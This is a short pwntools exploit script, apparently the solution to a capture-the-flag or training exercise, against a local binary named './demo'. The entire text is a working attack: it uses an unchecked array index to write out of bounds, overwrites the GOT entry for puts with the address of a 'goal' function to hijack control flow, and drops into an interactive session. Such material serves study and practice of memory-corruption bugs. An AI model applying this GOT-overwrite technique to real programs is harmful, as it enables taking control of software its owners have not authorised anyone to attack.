from pwn import *
context.arch = "amd64"

elf = ELF('./demo')
array = elf.symbols['array']
got_puts = elf.got['puts']
goal = elf.symbols['goal']

io = process('./demo')
offset = (got_puts - array) / 8
io.sendlineafter('index:', str(offset))
io.sendlineafter('value:', str(goal))
io.interactive()
